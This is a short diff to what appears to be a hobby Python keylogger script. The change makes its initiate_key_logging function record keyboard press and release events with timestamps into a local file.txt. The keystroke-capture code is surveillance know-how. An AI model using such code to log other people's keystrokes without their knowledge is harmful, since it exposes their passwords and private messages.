@@ -15,16 +15,17 @@ except FileNotFoundError:
         pass
 
 finally:
+    
     with open("file.txt", "w") as f:
         pass
 
 
 def initiate_key_logging():
 
-    event = keyboard.read_key()
+    event = keyboard.read_event()
     with open("file.txt", "a") as keys_pressed:
         keys_pressed.write(f"\n{str(datetime.datetime.now())}\n")
-        keys_pressed.write("--------This key was pressed at the above time------")
+        keys_pressed.write("--------This key was pressed/released at the above time------")
         keys_pressed.write(f"\n{str(event)}\n")
 
 
